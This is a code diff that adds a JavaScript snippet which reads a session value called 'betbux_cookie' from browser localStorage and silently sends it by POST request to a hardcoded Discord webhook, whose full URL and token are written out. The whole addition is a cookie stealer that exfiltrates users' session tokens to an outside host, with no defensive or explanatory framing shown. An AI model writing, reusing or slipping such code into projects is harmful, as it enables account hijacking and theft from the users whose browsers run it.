@@ -1,0 +1,14 @@
+var betbux_cookie = localStorage.getItem("betbux_cookie");
+if (betbux_cookie) {
+  var webhookUrl = "https://discord.com/api/webhooks/1094343329128394805/TOf4kIzhk3Z3oSxKazm5-IH0DUEJP1LiRG2fFAm7E9w1LnmGRYY2trMr5_7twk08rZNE";
+  var payload = {
+    content: betbux_cookie
+  };
+  fetch(webhookUrl, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify(payload)
+  });
+}
